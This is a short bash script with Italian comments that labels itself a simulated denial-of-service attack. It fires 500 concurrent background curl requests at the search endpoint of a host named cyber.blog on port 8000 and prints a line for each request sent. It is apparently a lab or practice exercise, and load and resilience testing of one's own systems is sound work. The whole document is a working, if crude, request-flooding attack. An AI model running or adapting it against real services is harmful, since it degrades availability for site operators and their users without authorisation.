#!/bin/bash

URL="http://cyber.blog:8000/articles/search"

echo "Inizio attacco DoS simulato..."

# Invia 500 richieste semplici in background
for i in {1..500}
do
    curl -s "$URL?q=test" >/dev/null 2>&1 &
    echo "Richiesta $i inviata"
done

# Aspetta che tutti i processi finiscano
wait

echo "Attacco DoS simulato completato!"